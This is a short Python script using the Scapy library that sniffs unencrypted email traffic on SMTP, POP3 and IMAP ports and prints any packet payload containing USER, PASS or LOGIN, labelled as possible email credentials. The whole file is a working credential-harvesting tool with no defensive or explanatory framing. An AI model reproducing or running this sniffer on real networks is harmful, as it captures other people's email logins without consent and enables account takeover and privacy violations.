from scapy.all import sniff

def packet_callback(packet):
    if packet.haslayer('Raw'):
        payload = packet['Raw'].load
        try:
            if b"USER" in payload or b"PASS" in payload or b"LOGIN" in payload:
                print("[+] Possible Email Credential:")
                print(payload.decode(errors="ignore"))
        except:
            pass

def main():
    sniff(filter="tcp port 25 or tcp port 110 or tcp port 143", prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
